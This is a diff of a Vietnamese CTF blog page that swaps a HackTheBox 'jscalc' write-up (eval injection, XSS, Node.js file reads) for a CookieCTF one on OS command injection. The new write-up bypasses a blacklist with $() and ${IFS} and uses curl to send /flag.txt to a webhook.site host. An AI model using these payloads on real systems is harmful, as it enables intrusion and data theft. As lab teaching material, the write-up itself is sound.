@@ -4,49 +4,50 @@
         <meta charset="utf-8">
         <meta name="viewport" content="width=device-width, initial-scale=1">
         <meta name="robots" content="noodp" />
-        <title>Hackthebox - jscalc - g03m0n</title><meta name="Description" content="g03m0n"><meta property="og:url" content="https://g03m0n.github.io/posts/hackthebox---jscalc/">
+        <title>CookieCTF - The Existed File - g03m0n</title><meta name="Description" content="g03m0n"><meta property="og:url" content="https://g03m0n.github.io/posts/cookiectf--the-existed-file/">
   <meta property="og:site_name" content="g03m0n">
-  <meta property="og:title" content="Hackthebox - jscalc">
-  <meta property="og:description" content="Description Link challenge tại đâyStep Đây là giao diện chính của challenge:
-Vì chương trình sử dụng hàm eval() để tính toán nên ta có thể tiêm vào một payload XSS:
-100*10-3&#43;340 &#43;&#39;&lt;img src=abc onerror=&#34;alert(123)&#34;&gt;&#39; Kiểm tra source code, đọc file package.json, nhận thấy challenge sử dụng node.js =&gt; Có thể execute JavaScript codeở back-end.
-Chương trình sử dụng API api/calculate. Từ web_jscalc/challenge/routes/computerHelper.js, hàm calculate() trả về kết quả từ hàm eval() và đưa ra một ngoại lệ chỉ khi có lỗi cú pháp.">
+  <meta property="og:title" content="CookieCTF - The Existed File">
+  <meta property="og:description" content="Description Link challenge tại đâyStep Đây là giao diện chính của challenge.
+Thử nhập /flag.txt vẫn không có thay đổi gì. Ta thử nhập cat /flag.txt xem có xem được flag không nhưng lại hiện ra thông báo Blacklist characters detected!.
+Kiểm tra soucre code có thể thấy luồng hoạt động của server.
+Đoạn code này loại bỏ khoảng trắng của input người dùng nhập vào. Nó sử dụng phương thức translate() của lớp string để thay thế tất cả các ký tự khoảng trắng bằng giá trị None.">
   <meta property="og:locale" content="en_us">
   <meta property="og:type" content="article">
     <meta property="article:section" content="posts">
-    <meta property="article:published_time" content="2023-08-22T08:29:01+08:00">
-    <meta property="article:modified_time" content="2023-08-22T08:29:01+08:00">
-    <meta property="article:tag" content="Htb">
-    <meta property="article:tag" content="Lab">
+    <meta property="article:published_time" content="2024-01-20T08:29:01+08:00">
+    <meta property="article:modified_time" content="2024-01-20T08:29:01+08:00">
+    <meta property="article:tag" content="Cookiectf">
     <meta property="article:tag" content="Ctf">
+    <meta property="article:tag" content="Easy_ctf">
+    <meta property="article:tag" content="Web">
     <meta property="og:image" content="https://g03m0n.github.io/logo.png">
 
   <meta name="twitter:card" content="summary_large_image">
   <meta name="twitter:image" content="https://g03m0n.github.io/logo.png">
-  <meta name="twitter:title" content="Hackthebox - jscalc">
-  <meta name="twitter:description" content="Description Link challenge tại đâyStep Đây là giao diện chính của challenge:
-Vì chương trình sử dụng hàm eval() để tính toán nên ta có thể tiêm vào một payload XSS:
-100*10-3&#43;340 &#43;&#39;&lt;img src=abc onerror=&#34;alert(123)&#34;&gt;&#39; Kiểm tra source code, đọc file package.json, nhận thấy challenge sử dụng node.js =&gt; Có thể execute JavaScript codeở back-end.
-Chương trình sử dụng API api/calculate. Từ web_jscalc/challenge/routes/computerHelper.js, hàm calculate() trả về kết quả từ hàm eval() và đưa ra một ngoại lệ chỉ khi có lỗi cú pháp.">
+  <meta name="twitter:title" content="CookieCTF - The Existed File">
+  <meta name="twitter:description" content="Description Link challenge tại đâyStep Đây là giao diện chính của challenge.
+Thử nhập /flag.txt vẫn không có thay đổi gì. Ta thử nhập cat /flag.txt xem có xem được flag không nhưng lại hiện ra thông báo Blacklist characters detected!.
+Kiểm tra soucre code có thể thấy luồng hoạt động của server.
+Đoạn code này loại bỏ khoảng trắng của input người dùng nhập vào. Nó sử dụng phương thức translate() của lớp string để thay thế tất cả các ký tự khoảng trắng bằng giá trị None.">
 <meta name="application-name" content="g03m0n">
 <meta name="apple-mobile-web-app-title" content="g03m0n"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
         <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
-        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://g03m0n.github.io/posts/hackthebox---jscalc/" /><link rel="prev" href="https://g03m0n.github.io/posts/portswigger-xxe/" /><link rel="next" href="https://g03m0n.github.io/posts/hacthebox---proxyasservice/" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"><script type="application/ld+json">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://g03m0n.github.io/posts/cookiectf--the-existed-file/" /><link rel="prev" href="https://g03m0n.github.io/posts/portswigger-sqli/" /><link rel="next" href="https://g03m0n.github.io/posts/cve-2021-3129/" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"><script type="application/ld+json">
     {
         "@context": "http://schema.org",
         "@type": "BlogPosting",
-        "headline": "Hackthebox - jscalc",
+        "headline": "CookieCTF - The Existed File",
         "inLanguage": "en-us",
         "mainEntityOfPage": {
             "@type": "WebPage",
-            "@id": "https:\/\/g03m0n.github.io\/posts\/hackthebox---jscalc\/"
+            "@id": "https:\/\/g03m0n.github.io\/posts\/cookiectf--the-existed-file\/"
         },"image": [{
                             "@type": "ImageObject",
                             "url": "https:\/\/g03m0n.github.io\/images\/Apple-Devices-Preview.png",
                             "width":  3200 ,
                             "height":  2048 
-                        }],"genre": "posts","keywords": "htb, lab, ctf","wordcount":  210 ,
-        "url": "https:\/\/g03m0n.github.io\/posts\/hackthebox---jscalc\/","datePublished": "2023-08-22T08:29:01+08:00","dateModified": "2023-08-22T08:29:01+08:00","publisher": {
+                        }],"genre": "posts","keywords": "cookiectf, ctf, easy_ctf, web","wordcount":  250 ,
+        "url": "https:\/\/g03m0n.github.io\/posts\/cookiectf--the-existed-file\/","datePublished": "2024-01-20T08:29:01+08:00","dateModified": "2024-01-20T08:29:01+08:00","publisher": {
             "@type": "Organization",
             "name": "xxxx","logo": "https:\/\/g03m0n.github.io\/images\/avatar.png"},"author": {
                 "@type": "Person",
@@ -132,11 +133,11 @@ Chương trình sử dụng API api/calculate. Từ web_jscalc/challenge/routes/
                 <div class="container"><div class="toc" id="toc-auto">
             <h2 class="toc-title">Contents</h2>
             <div class="toc-content always-active" id="toc-content-auto"></div>
-        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Hackthebox - jscalc</h1><div class="post-meta">
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">CookieCTF - The Existed File</h1><div class="post-meta">
             <div class="post-meta-line"><span class="post-author"><a href="https://github.com/g03m0n" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>g03m0n</a>
-</span>&nbsp;<span class="post-category">included in <a href="/categories/hackthebox/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Hackthebox</a></span></div>
-            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2023-08-22">2023-08-22</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;210 words&nbsp;
-                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;One minute&nbsp;</div>
+</span>&nbsp;<span class="post-category">included in <a href="/categories/cookiectf/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>CookieCTF</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2024-01-20">2024-01-20</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;250 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;2 minutes&nbsp;</div>
         </div><div class="details toc" id="toc-static"  data-kept="">
                 <div class="details-summary toc-title">
                     <span>Contents</span>
@@ -149,126 +150,108 @@ Chương trình sử dụng API api/calculate. Từ web_jscalc/challenge/routes/
   </ul>
 </nav></div>
             </div><div class="content" id="content"><h2 id="description">Description</h2>
-<p>Link challenge tại <a href="https://app.hackthebox.com/challenges/jscalc" target="_blank" rel="noopener noreffer">đây</a>
+<p>Link challenge tại <a href="https://battle.cookiearena.org/arenas/mini-ctf-web-hacking/battle/the-existed-file" target="_blank" rel="noopener noreffer">đây</a>
 </p>
 <h2 id="step">Step</h2>
-<p>Đây là giao diện chính của challenge:</p>
+<p>Đây là giao diện chính của challenge.</p>
 <p><img
         class="lazyload"
         src="/svg/loading.min.svg"
-        data-src="https://github.com/g03m0n/pics/assets/130943529/0908df69-912e-48ca-8a83-4faf67075336"
-        data-srcset="https://github.com/g03m0n/pics/assets/130943529/0908df69-912e-48ca-8a83-4faf67075336, https://github.com/g03m0n/pics/assets/130943529/0908df69-912e-48ca-8a83-4faf67075336 1.5x, https://github.com/g03m0n/pics/assets/130943529/0908df69-912e-48ca-8a83-4faf67075336 2x"
+        data-src="https://github.com/g03m0n/pics/assets/130943529/da3d77ee-89c3-48fb-b492-868b8baed039"
+        data-srcset="https://github.com/g03m0n/pics/assets/130943529/da3d77ee-89c3-48fb-b492-868b8baed039, https://github.com/g03m0n/pics/assets/130943529/da3d77ee-89c3-48fb-b492-868b8baed039 1.5x, https://github.com/g03m0n/pics/assets/130943529/da3d77ee-89c3-48fb-b492-868b8baed039 2x"
         data-sizes="auto"
-        alt="https://github.com/g03m0n/pics/assets/130943529/0908df69-912e-48ca-8a83-4faf67075336"
+        alt="https://github.com/g03m0n/pics/assets/130943529/da3d77ee-89c3-48fb-b492-868b8baed039"
         title="image" /></p>
-<p>Vì chương trình sử dụng hàm <code>eval()</code> để tính toán nên ta có thể tiêm vào một payload XSS:</p>
-<pre tabindex="0"><code>100*10-3+340 +&#39;&lt;img src=abc onerror=&#34;alert(123)&#34;&gt;&#39;
-</code></pre><p><img
-        class="lazyload"
-        src="/svg/loading.min.svg"
-        data-src="https://github.com/g03m0n/pics/assets/130943529/9ba0e4db-e9a8-4363-97b5-b899ca6697c7"
-        data-srcset="https://github.com/g03m0n/pics/assets/130943529/9ba0e4db-e9a8-4363-97b5-b899ca6697c7, https://github.com/g03m0n/pics/assets/130943529/9ba0e4db-e9a8-4363-97b5-b899ca6697c7 1.5x, https://github.com/g03m0n/pics/assets/130943529/9ba0e4db-e9a8-4363-97b5-b899ca6697c7 2x"
-        data-sizes="auto"
-        alt="https://github.com/g03m0n/pics/assets/130943529/9ba0e4db-e9a8-4363-97b5-b899ca6697c7"
-        title="image" /></p>
-<p>Kiểm tra source code, đọc file <code>package.json</code>, nhận thấy challenge sử dụng <code>node.js</code>
-=&gt; Có thể <a href="https://www.codecademy.com/learn/javascript-back-end-development/modules/introduction-to-node-js/cheatsheet" target="_blank" rel="noopener noreffer">execute JavaScript code</a>
- ở back-end.</p>
+<p>Thử nhập <code>/flag.txt</code> vẫn không có thay đổi gì. Ta thử nhập <code>cat /flag.txt</code> xem có xem được <code>flag</code> không nhưng lại hiện ra thông báo <code>Blacklist characters detected!</code>.</p>
 <p><img
         class="lazyload"
         src="/svg/loading.min.svg"
-        data-src="https://github.com/g03m0n/pics/assets/130943529/a9be13d1-4dff-4ea4-af0c-62aef3a35b47"
-        data-srcset="https://github.com/g03m0n/pics/assets/130943529/a9be13d1-4dff-4ea4-af0c-62aef3a35b47, https://github.com/g03m0n/pics/assets/130943529/a9be13d1-4dff-4ea4-af0c-62aef3a35b47 1.5x, https://github.com/g03m0n/pics/assets/130943529/a9be13d1-4dff-4ea4-af0c-62aef3a35b47 2x"
+        data-src="https://github.com/g03m0n/pics/assets/130943529/3b6e0694-a1c4-47a4-97f3-2163278fa5ca"
+        data-srcset="https://github.com/g03m0n/pics/assets/130943529/3b6e0694-a1c4-47a4-97f3-2163278fa5ca, https://github.com/g03m0n/pics/assets/130943529/3b6e0694-a1c4-47a4-97f3-2163278fa5ca 1.5x, https://github.com/g03m0n/pics/assets/130943529/3b6e0694-a1c4-47a4-97f3-2163278fa5ca 2x"
         data-sizes="auto"
-        alt="https://github.com/g03m0n/pics/assets/130943529/a9be13d1-4dff-4ea4-af0c-62aef3a35b47"
+        alt="https://github.com/g03m0n/pics/assets/130943529/3b6e0694-a1c4-47a4-97f3-2163278fa5ca"
         title="image" /></p>
-<p>Chương trình sử dụng API <code>api/calculate</code>.
-Từ <code>web_jscalc/challenge/routes/computerHelper.js</code>, hàm <code>calculate()</code> trả về kết quả từ hàm <code>eval()</code> và đưa ra một ngoại lệ chỉ khi có lỗi cú pháp. Do đó nó không kiểm tra các trường hợp ngoại lệ khác.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">---</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">module</span><span style="color:#f92672">.</span><span style="color:#a6e22e">exports</span> <span style="color:#f92672">=</span> {
-</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">calculate</span>(<span style="color:#a6e22e">formula</span>) {
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span> {
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">eval</span>(<span style="color:#e6db74">`(function() { return ${ formula } ;}())`</span>);                                                 
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">e</span>) {
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">e</span> <span style="color:#a6e22e">instanceof</span> <span style="color:#a6e22e">SyntaxError</span>) {
-</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;Something went wrong!&#39;</span>;
-</span></span><span style="display:flex;"><span>            }
-</span></span><span style="display:flex;"><span>        }
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>}
-</span></span><span style="display:flex;"><span><span style="color:#f92672">---</span>
-</span></span></code></pre></div><p><code>Node.js</code> có một số mô-đun tích hợp có thể được sử dụng để chèn lệnh: <code>process</code>, <code>fs</code>, <code>readdir()</code>, <code>readFile()</code>,&hellip;</p>
-<p>Tiến hành khai thác:
-Đầu tiên kiểm tra đường dẫn hiện tại bằng query:</p>
-<pre tabindex="0"><code>process.cwd()
-</code></pre><p><img
+<p>Kiểm tra <code>soucre code</code> có thể thấy luồng hoạt động của server.</p>
+<p><img
         class="lazyload"
         src="/svg/loading.min.svg"
-        data-src="https://github.com/g03m0n/pics/assets/130943529/fe63d98e-853c-4675-9962-9a83b7407920"
-        data-srcset="https://github.com/g03m0n/pics/assets/130943529/fe63d98e-853c-4675-9962-9a83b7407920, https://github.com/g03m0n/pics/assets/130943529/fe63d98e-853c-4675-9962-9a83b7407920 1.5x, https://github.com/g03m0n/pics/assets/130943529/fe63d98e-853c-4675-9962-9a83b7407920 2x"
+        data-src="https://github.com/g03m0n/pics/assets/130943529/80e29e56-dda0-42ea-aa1c-3a47baba3b2c"
+        data-srcset="https://github.com/g03m0n/pics/assets/130943529/80e29e56-dda0-42ea-aa1c-3a47baba3b2c, https://github.com/g03m0n/pics/assets/130943529/80e29e56-dda0-42ea-aa1c-3a47baba3b2c 1.5x, https://github.com/g03m0n/pics/assets/130943529/80e29e56-dda0-42ea-aa1c-3a47baba3b2c 2x"
         data-sizes="auto"
-        alt="https://github.com/g03m0n/pics/assets/130943529/fe63d98e-853c-4675-9962-9a83b7407920"
+        alt="https://github.com/g03m0n/pics/assets/130943529/80e29e56-dda0-42ea-aa1c-3a47baba3b2c"
         title="image" /></p>
-<p>Kiểm tra các thư mục và file có trong thư mục hiện tại bằng cách sử dụng <code>readdirSync()</code>:</p>
-<pre tabindex="0"><code>require(&#39;fs&#39;).readdirSync(&#39;/app&#39;).toString()
-</code></pre><p><img
+<p>Đoạn code này loại bỏ khoảng trắng của <code>input</code> người dùng nhập vào. Nó sử dụng phương thức <code>translate()</code> của lớp <code>string</code> để thay thế tất cả các ký tự khoảng trắng bằng giá trị <code>None</code>.
+Sau đó sẽ sử dung hàm <code>is_blacklisted</code> để kiểm tra <code>input</code> có nằm trong blacklist hay không.</p>
+<p>Có thể thấy <code>blacklist</code> đã loại bỏ hầu hết các câu lệnh giúp ta đọc được file <code>flag</code>, tuy nhiên anh dev có lẽ đã quên mất <code>filter</code> 1 cái nữa đó là <code>$(command)</code>. Câu lệnh này tương đương với sử dụng dấu <code>backstick</code>.</p>
+<p><img
         class="lazyload"
         src="/svg/loading.min.svg"
-        data-src="https://github.com/g03m0n/pics/assets/130943529/a7fe7b39-fcc5-4110-a33e-faf75e4e6f7a"
-        data-srcset="https://github.com/g03m0n/pics/assets/130943529/a7fe7b39-fcc5-4110-a33e-faf75e4e6f7a, https://github.com/g03m0n/pics/assets/130943529/a7fe7b39-fcc5-4110-a33e-faf75e4e6f7a 1.5x, https://github.com/g03m0n/pics/assets/130943529/a7fe7b39-fcc5-4110-a33e-faf75e4e6f7a 2x"
+        data-src="https://github.com/g03m0n/pics/assets/130943529/cd5a4e34-18f7-4d02-9122-709f9bc537bb"
+        data-srcset="https://github.com/g03m0n/pics/assets/130943529/cd5a4e34-18f7-4d02-9122-709f9bc537bb, https://github.com/g03m0n/pics/assets/130943529/cd5a4e34-18f7-4d02-9122-709f9bc537bb 1.5x, https://github.com/g03m0n/pics/assets/130943529/cd5a4e34-18f7-4d02-9122-709f9bc537bb 2x"
         data-sizes="auto"
-        alt="https://github.com/g03m0n/pics/assets/130943529/a7fe7b39-fcc5-4110-a33e-faf75e4e6f7a"
+        alt="https://github.com/g03m0n/pics/assets/130943529/cd5a4e34-18f7-4d02-9122-709f9bc537bb"
         title="image" /></p>
-<p>Thêm dấu <code>..</code> vào trước đường dẫn để kiểm tra tại thư mục <code>/</code>:</p>
-<pre tabindex="0"><code>require(&#39;fs&#39;).readdirSync(&#39;../&#39;).toString()
-</code></pre><p><img
+<p>Quay lại challenge thử chạy luôn nhưng nó vẫn không xuất được nội dung</p>
+<p><img
         class="lazyload"
         src="/svg/loading.min.svg"
-        data-src="https://github.com/g03m0n/pics/assets/130943529/6e901104-8ace-4c19-882f-a6b623f6ef92"
-        data-srcset="https://github.com/g03m0n/pics/assets/130943529/6e901104-8ace-4c19-882f-a6b623f6ef92, https://github.com/g03m0n/pics/assets/130943529/6e901104-8ace-4c19-882f-a6b623f6ef92 1.5x, https://github.com/g03m0n/pics/assets/130943529/6e901104-8ace-4c19-882f-a6b623f6ef92 2x"
+        data-src="https://github.com/g03m0n/pics/assets/130943529/0df9ad8d-c4c1-419a-a4ae-51a76ceead2f"
+        data-srcset="https://github.com/g03m0n/pics/assets/130943529/0df9ad8d-c4c1-419a-a4ae-51a76ceead2f, https://github.com/g03m0n/pics/assets/130943529/0df9ad8d-c4c1-419a-a4ae-51a76ceead2f 1.5x, https://github.com/g03m0n/pics/assets/130943529/0df9ad8d-c4c1-419a-a4ae-51a76ceead2f 2x"
         data-sizes="auto"
-        alt="https://github.com/g03m0n/pics/assets/130943529/6e901104-8ace-4c19-882f-a6b623f6ef92"
+        alt="https://github.com/g03m0n/pics/assets/130943529/0df9ad8d-c4c1-419a-a4ae-51a76ceead2f"
         title="image" /></p>
-<p>Sử dụng <code>readFileSync()</code> để đọc file <code>flag.txt</code>:</p>
-<pre tabindex="0"><code>require(&#39;fs&#39;).readFileSync(&#34;/flax.txt&#34;).toString()
-</code></pre><p><img
+<p>Tới đây ta để ý <code>blacklist</code> không lọc lệnh <code>curl</code> nên ta có thể gửi file <code>flag</code> qua host khác để đọc bằng option <code>-F</code>.
+Ở đây mình sử dụng <code>webhook.site</code> để làm host nhận file.</p>
+<p>Payload: <code>curl -F @/flag.txt https://webhook.site/407cb1c3-4316-4cb8-8b9c-4ece7abf8d11</code></p>
+<p>Nhưng vẫn còn hàm <code>translate()</code> loại bỏ khoảng trắng của <code>input</code>. Search gg một lúc thì mình tìm được cái này:</p>
+<p><img
         class="lazyload"
         src="/svg/loading.min.svg"
-        data-src="https://github.com/g03m0n/pics/assets/130943529/d7466910-8d79-4be8-99eb-e406a56164e6"
-        data-srcset="https://github.com/g03m0n/pics/assets/130943529/d7466910-8d79-4be8-99eb-e406a56164e6, https://github.com/g03m0n/pics/assets/130943529/d7466910-8d79-4be8-99eb-e406a56164e6 1.5x, https://github.com/g03m0n/pics/assets/130943529/d7466910-8d79-4be8-99eb-e406a56164e6 2x"
+        data-src="https://github.com/g03m0n/pics/assets/130943529/a38abfaf-f04e-45e5-90d2-6af3a2d0260a"
+        data-srcset="https://github.com/g03m0n/pics/assets/130943529/a38abfaf-f04e-45e5-90d2-6af3a2d0260a, https://github.com/g03m0n/pics/assets/130943529/a38abfaf-f04e-45e5-90d2-6af3a2d0260a 1.5x, https://github.com/g03m0n/pics/assets/130943529/a38abfaf-f04e-45e5-90d2-6af3a2d0260a 2x"
         data-sizes="auto"
-        alt="https://github.com/g03m0n/pics/assets/130943529/d7466910-8d79-4be8-99eb-e406a56164e6"
+        alt="https://github.com/g03m0n/pics/assets/130943529/a38abfaf-f04e-45e5-90d2-6af3a2d0260a"
         title="image" /></p>
-<p>Flag: <code>HTB{c4lcul4t3d_my_w4y_thr0ugh_rc3}</code></p>
+<p>Có thể sử dụng <code>${IFS}</code> để thay thế các ký tự <code>&lt;space&gt;</code> <code>&lt;tab&gt;</code> <code>&lt;newline&gt;</code>.</p>
+<p>Payload: <code>$(curl${IFS}-F${IFS}file=@/flag.txt${IFS}https://webhook.site/407cb1c3-4316-4cb8-8b9c-4ece7abf8d11)</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://github.com/g03m0n/pics/assets/130943529/22580b80-a20d-4607-87a8-f875f0585a76"
+        data-srcset="https://github.com/g03m0n/pics/assets/130943529/22580b80-a20d-4607-87a8-f875f0585a76, https://github.com/g03m0n/pics/assets/130943529/22580b80-a20d-4607-87a8-f875f0585a76 1.5x, https://github.com/g03m0n/pics/assets/130943529/22580b80-a20d-4607-87a8-f875f0585a76 2x"
+        data-sizes="auto"
+        alt="https://github.com/g03m0n/pics/assets/130943529/22580b80-a20d-4607-87a8-f875f0585a76"
+        title="image" /></p>
+<p>Tải file <code>flag.txt</code>về ta được flag:
+<code>CHH{os_c0mManD_INj3cTi0N_bypa5S_FIL7Er_b1f4b3371b6a365f47334d3ec07a8d0e}</code></p>
 </div><div class="post-footer" id="post-footer">
     <div class="post-info">
         <div class="post-info-line">
             <div class="post-info-mod">
-                <span>Updated on 2023-08-22</span>
+                <span>Updated on 2024-01-20</span>
             </div></div>
         <div class="post-info-line">
             <div class="post-info-md"></div>
             <div class="post-info-share">
-                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://g03m0n.github.io/posts/hackthebox---jscalc/" data-title="Hackthebox - jscalc" data-hashtags="htb,lab,ctf"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://g03m0n.github.io/posts/hackthebox---jscalc/" data-hashtag="htb"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://g03m0n.github.io/posts/hackthebox---jscalc/" data-title="Hackthebox - jscalc"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a></span>
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://g03m0n.github.io/posts/cookiectf--the-existed-file/" data-title="CookieCTF - The Existed File" data-hashtags="cookiectf,ctf,easy_ctf,web"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://g03m0n.github.io/posts/cookiectf--the-existed-file/" data-hashtag="cookiectf"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://g03m0n.github.io/posts/cookiectf--the-existed-file/" data-title="CookieCTF - The Existed File"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a></span>
             </div>
         </div>
     </div>
 
     <div class="post-info-more">
-        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/htb/">Htb</a>,&nbsp;<a href="/tags/lab/">Lab</a>,&nbsp;<a href="/tags/ctf/">Ctf</a></section>
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/cookiectf/">Cookiectf</a>,&nbsp;<a href="/tags/ctf/">Ctf</a>,&nbsp;<a href="/tags/easy_ctf/">Easy_ctf</a>,&nbsp;<a href="/tags/web/">Web</a></section>
         <section>
             <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
         </section>
     </div>
 
-    <div class="post-nav"><a href="/posts/portswigger-xxe/" class="prev" rel="prev" title="PortSwigger - XXE"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>PortSwigger - XXE</a>
-            <a href="/posts/hacthebox---proxyasservice/" class="next" rel="next" title="Hackthebox - ProxyAsService">Hackthebox - ProxyAsService<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+    <div class="post-nav"><a href="/posts/portswigger-sqli/" class="prev" rel="prev" title="PortSwigger - SQL Injection"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>PortSwigger - SQL Injection</a>
+            <a href="/posts/cve-2021-3129/" class="next" rel="next" title="CVE-2021-3129">CVE-2021-3129<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
 </div>
 <div id="comments"><div id="fb-root" class="comment"></div>
             <div
                 class="fb-comments"
-                data-href="https://g03m0n.github.io/posts/hackthebox---jscalc/"
+                data-href="https://g03m0n.github.io/posts/cookiectf--the-existed-file/"
                 data-width="100%"
                 data-numposts="10"
             ></div><noscript>
